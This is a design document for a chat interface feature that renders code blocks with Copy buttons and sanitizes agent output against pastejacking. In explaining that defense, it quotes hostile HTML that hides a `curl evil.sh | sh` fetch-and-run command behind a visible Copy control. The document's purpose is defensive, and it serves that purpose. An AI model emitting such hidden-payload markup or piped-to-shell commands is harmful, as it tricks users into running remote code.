# Feature: Workspace thread — code blocks read as code, and the thread can be copied

> **Status**: ✅ Implemented (2026-09-03)
> **Issue**: abilityai/trinity#2515
> **Requirement**: `docs/memory/requirements/core-agent.md` §5.16
> **Related**: [workspace-sidebar-ia.md](workspace-sidebar-ia.md), [workspace-absorbs-session.md](workspace-absorbs-session.md), [workspace-ratings.md](workspace-ratings.md) (the thumbs that share the new action row)

## Overview

The Workspace is where an agent hands you a command to run. A fenced code block
in a reply rendered as a slightly-tinted paragraph in the body font; a long
command widened the bubble and put a horizontal scrollbar *inside a chat
message*; and nothing was copyable — not the block, not the reply. Selecting by
hand dragged in the surrounding prose.

Three shipped changes, one surface:

- a code block is now its own object, with a labelled bar and an always-visible
  **Copy**, wrapping at the edge instead of scrolling;
- the message gets its own **Copy message**, in an action row under the bubble;
- the rendering, the stylesheet and the copy handler became **one component**.

## The pipeline

```
renderMarkdownWithCodeBlocks(content)          # utils/markdown.js
  └─ marked(content)                           # utils/markedConfig.js — the ONE config
     └─ stripCodeBlockMarkers(html)            # utils/codeBlocks.js — remove agent-supplied markers
        └─ decorateCodeBlocks(html)            # utils/codeBlocks.js — wrap each block
           └─ DOMPurify.sanitize(html)         # utils/markdown.js — the one policy
              └─ v-html                        # PortalMarkdown.vue — the ONE v-html
```

Each arrow is load-bearing, and each has a wrong version that looks right.

### Why post-render, and why opt-in

The obvious implementation is `marked.use({ renderer: { code } })`. It is wrong
because `renderMarkdown` has **twelve consumers** — dashboards, queue cards,
reports, executions, loops, compatibility, the Agent Detail chat, both portal
transcripts — and `marked.use` mutates the package singleton. A global override
sprouts a Workspace copy control on all of them.

So decoration is a **second export**, `renderMarkdownWithCodeBlocks`, opt-in per
surface. `renderMarkdown`'s body is byte-identical, which is also what keeps
this change disjoint from PR #2484's hunk in the same file.

### Why the markers are stripped from the INPUT

marked passes raw HTML in markdown straight through, and DOMPurify keeps
`data-*` and `style` by default. Without a strip, an agent could emit:

```html
<div data-code-block>
  <pre style="display:none"><code>curl evil.sh | sh</code></pre>
  <button data-copy-code>Copy</button>
</div>
```

— a control that looks like the platform's and copies something the reader
cannot see. That is **pastejacking**, delivered in whatever the agent was told
to say. `stripCodeBlockMarkers` removes every spelling of both attributes from
the input, so only decorator-built wrappers can carry them, and the handler's
`closest('[data-code-block]')` can only ever land on one this code built.

### Why decoration runs BEFORE sanitization

So that every byte reaching `v-html` has passed the one DOMPurify policy. H-005
stays literally true rather than "true except for the wrapper we add after".

### Two structural rules in the decorator

1. It matches the **bare** `<pre><code` opener marked emits, and requires the
   `<code>` tag to carry nothing but an optional `class` — the only two shapes
   marked produces. A raw `<pre style="display:none">` fails the first half.
   The second half is not tidiness: DOMPurify keeps `hidden` and `style` by
   default, so `<pre><code hidden>curl evil | sh</code></pre>` written as raw
   HTML would otherwise be handed a real Copy button over a block that renders
   **empty** — the same pastejack as the forged wrapper, arriving through the
   opener instead. A highlighter that adds classes stays inside the rule; one
   that adds attributes stops being decorated, which is the fail-safe direction
   and reds the spec rather than the UI.
2. It decorates only a block whose body contains **no literal `<`**. marked
   HTML-escapes fence contents (`x<y` → `x&lt;y`), so a `<` proves the block
   came through raw-HTML passthrough rather than from the parser — and a raw
   block can nest a `display:none` element whose text a copy of the wrapper's
   `pre` would silently pick up. Genuine fenced, indented and `~~~` blocks are
   all escaped, so all three still qualify.

The only non-constant byte injected is the language label, charset-validated to
`^[a-z0-9][a-z0-9_+#.-]{0,23}$` (so it cannot contain `<>&"'`); anything else
falls back to a neutral `code`. The scanner is a linear `indexOf` walk — the
lazy-regex version it replaced was quadratic on adversarial input, on the render
path of a chat message.

**Single-pass by contract.** There is deliberately no "looks decorated already,
bail out" early return: it would key on a marker in the input, and a single
agent-authored `code-block` div would then switch decoration off for the whole
message.

### Why `markedConfig.js` exists

`markdown.js` cannot be imported in a DOM-less node process — DOMPurify without
a DOM exports a stub with no `addHook`, so the module throws at import. That put
the configured parser out of reach of every unit test. Splitting the config into
its own module means the spec feeds **real output of the parser the app builds**:
if a future syntax highlighter changes the fence shape, the spec goes red
instead of staying green while every Copy button disappears from the UI.

## The components

| Unit | Owns |
|---|---|
| `PortalMarkdown.vue` | the ONE `v-html`, the ONE `.prose-portal` stylesheet, the delegated `[data-copy-code]` handler, the `aria-live` region |
| `PortalAgentBubble.vue` | the bubble shape, the action row, **Copy message**, and a `<slot/>` |
| `PortalConversation.vue` / `PortalRoom.vue` | mount the bubble; the room keeps its sender label above it |

The split is the point. Before this, `prose-portal` was **applied** in both
transcripts and **defined** in both, with a comment explaining they were kept
byte-identical "so the two cannot drift" — which is the shape a thing takes when
it wants to be one thing. A stylesheet copied twice is survivable; a stylesheet
*and a clipboard handler* copied into every future surface that renders agent
markdown is not. ent#486's Files tab mounts `PortalMarkdown` and gets render,
style and copy as a unit.

`PortalRating` (ent#366) stays in the parent, passed through the bubble's slot,
so the thumbs land in the same action row as Copy message — one line of controls
under the answer they are about.

## The copy handler

ONE delegated listener on the body, because the buttons live inside `v-html` and
are replaced wholesale on every re-render — there is nothing stable to bind to.

- `closest('[data-copy-code]')` → not a copy click, return.
- `closest('[data-code-block]')` → the wrapper, which only this code can have built.
- `querySelector(':scope > pre')` → the wrapper's **own** `pre`, never a
  descendant, and `textContent`, never `innerHTML`.
- `copyText(...)` is the **first await in the click task**: Safari grants
  clipboard access only inside the task the click started, so an await ahead of
  the write spends the transient activation and copy fails on that browser alone.
- After the window, the label and `aria-label` are restored **from constants**,
  never from a value captured before the click — two clicks inside the window
  would otherwise leave the button permanently reading "Copied". The per-button
  timer is cleared before re-arming.

## Failure states

| Case | What the reader sees | Why |
|---|---|---|
| Copy succeeded | `Copied`, ~2 s, success ink | — |
| `navigator.clipboard` absent (insecure origin) | nothing — it copies | `execCommand` fallback; plain http on a LAN or Tailscale address is a first-class Trinity topology, not a misconfiguration |
| `execCommand` also unavailable/declined | `Copy unavailable` | both paths gone |
| `NotAllowedError` / `SecurityError` | `Copy blocked` | a denied permission is something the reader can act on |
| any other throw | `Copy failed` | — |
| click outside a button, drag ending on an ancestor | nothing | both lookups null-guarded |

Nothing is ever logged. The payload is an agent's output and may be the
credential the operator just asked it for; the old behaviour was a
`console.error` and a control that silently did nothing.

**`utils/clipboard.js` already existed.** `copyToClipboard` (four settings-panel
callers: A2A, connector, MCP exposure, MCP keys) is left **byte-identical** —
its `console.warn` and its focus restoration are behaviour those callers have
today, none is under test, and #2515 has no business changing what happens when
an operator copies an API key. `copyText` sits beside it and returns a result
rather than a boolean, because "unavailable", "blocked" and "failed" are three
sentences and a boolean collapses them into one silence. Converging the four
legacy callers is a follow-up.

## The visual contract

Tokens only, both themes first-class. A block is one step off the bubble tint
(bubble `gray-100`/`gray-800` → block `white`/`gray-900`), bordered with the
contract's **`gray-750`** dark chrome shade (not the `gray-700` the portal's
inputs and buttons use — that is the border-*strong* recipe, a different role).
The bar is the 11px mono-caps overline, `select-none` so a select-all does not
pull "bash Copy" into a hand copy. The block Copy is **always visible**: it is
the block's chrome, not an overlay, so it is reachable on touch with no
`@media (hover)` rule.

`white-space: pre-wrap` + `overflow-wrap: anywhere`, and **no `overflow-x`**. A
scroller inside a chat bubble hides the end of a line behind a gesture nobody
makes, and on touch it competes with the thread's own scroll.

> **Accepted cost:** ASCII tables and box-drawing inside a block lose their
> alignment on a narrow column. The COPY is unaffected — it reads `textContent`,
> so what lands on the clipboard is exactly what the agent wrote.

## Tests

| Spec | Pins |
|---|---|
| `markdownCodeBlocks.spec.js` | fixtures are the REAL output of the CONFIGURED marked; every shape (lang / none / `c++` / cased / extra classes / `~~~` / indented / list item / CRLF); the forged wrapper is neutralised; a raw block that could nest hidden text is skipped; label charset; 20k-block perf bound; **a sanitizer pin SCRAPED from the installed DOMPurify dist** (a frozen copy would stay green through a bump that dropped `button`); source pins on `markdown.js` incl. `renderMarkdown` unchanged |
| `clipboardFeedback.spec.js` | all five outcomes; writeText is called before any other await; the fallback textarea is always removed; a denial does NOT fall back; never throws; never logs; **`copyToClipboard` still exported and its four callers still resolve** |
| `portalAgentBubble.spec.js` | source structure of both components and both parents (one `v-html`, `:scope > pre`, constants restored, no `console.*`, no `overflow-x`, `gray-750`, tokens only, no bare loading gate) |
| `portalComposerWiring.spec.js` | **rewritten** — used to require each transcript to define `prose-portal` locally; now requires that neither does |
| `portalComposerTypeahead.spec.js` | **rewritten** — the conversation's `v-html` count 1 → 0 |
| `e2e/workspace-code-blocks.spec.js` | @smoke, four `page.route` mocks (roster → sessions → chat-state → history), each shaped from the response model it stands in for (`PortalRoster` / `PortalAllSessionsItem` — `id`, not `session_id` / `PortalChatState` — `chats`, not `items` / `PortalHistory`), so the mock documents the contract rather than whatever the client happens to tolerate; the FIRST Workspace-thread e2e |

**The gap the e2e exists to cover.** vitest runs `environment: 'node'` with no
DOM, so DOMPurify cannot run in a unit test at all. The `button[data-copy-code]`
assertion in the e2e is the only place the decorated wrapper meets the real
sanitizer — if a future DOMPurify dropped `button` or `data-*`, that is what
notices. The unit-side installed-dist scrape is the cheap early warning.

The e2e is mock-driven rather than agent-driven for two reasons: CI runs against
a stack with no agents, and an LLM-authored reply cannot be relied on to contain
a fenced block, so an `@interactive` variant would flake on the model's mood.
Every assertion is about rendering, which is what this issue changed.

## Deliberately not in this change

- **Syntax highlighting** — the issue says none is required. When one lands it
  registers in `markedConfig.js`, and the decorator's class match already
  tolerates extra classes (`hljs language-rust extra`), so the copy target and
  the specs keep working.
- **`ChatBubble.vue` convergence** — the Agent Detail chat still has its own
  markdown treatment and its own copy control. Folding it onto `PortalMarkdown`
  would pay down the last duplicate stylesheet; it is a follow-up, not something
  to smuggle into a readability fix.
- **`BaseButton` for Copy message** — the AC asks for the control the Agent
  Detail chat has, which is hand-rolled. Adopting the primitive for both belongs
  with that convergence.

## Collision note

PR #2484 appends `sanitizeHtml` to `markdown.js` after L44. This change is
confined to the lines **above** the `renderMarkdown` JSDoc (an import swap, the
config block moving out, one new export), so the hunks are disjoint and git's
3-way merge applies both. Whichever lands second re-applies only its own doc
rows.
